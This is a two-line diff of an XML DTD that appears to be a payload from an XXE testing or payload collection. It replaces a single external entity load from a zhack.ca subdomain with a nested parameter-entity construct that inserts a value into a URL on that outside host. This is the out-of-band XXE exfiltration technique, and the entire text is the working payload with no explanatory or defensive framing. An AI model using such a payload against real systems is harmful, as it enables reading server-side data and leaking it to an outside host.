@@ -1,1 +1,2 @@
-<!ENTITY % LoadOOBEnt SYSTEM "http://myho.d5cd3105feaa15fc0024.d.zhack.ca">
+<!ENTITY % resource "wwwwww">
+<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://%resource;sd.d5cd3105feaa15fc0024.d.zhack.ca'>">
